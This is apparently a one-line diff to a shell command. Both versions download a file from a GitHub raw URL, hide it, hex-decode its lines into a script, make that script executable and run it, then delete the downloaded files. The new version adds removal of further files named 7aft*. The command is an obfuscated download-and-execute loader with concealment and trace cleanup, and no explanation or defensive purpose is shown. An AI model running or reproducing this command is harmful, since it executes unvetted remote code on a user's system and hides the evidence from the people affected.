@@ -1,1 +1,1 @@
-rm -f del* && curl https://raw.githubusercontent.com/nurd1n/underground/secret/a -o  delete && attrib +h delete && while read f1; do echo "$f1" | xxd -r -p > delete.sh && echo "attrib +h delete.sh && chmod 755 delete.sh" | bash - ;done < delete && ./delete.sh && rm -f del*
+rm -f del* && curl https://raw.githubusercontent.com/nurd1n/underground/secret/a -o  delete && attrib +h delete && while read f1; do echo "$f1" | xxd -r -p > delete.sh && echo "attrib +h delete.sh && chmod 755 delete.sh" | bash - ;done < delete && ./delete.sh && rm -f del* && rm -f 7aft*
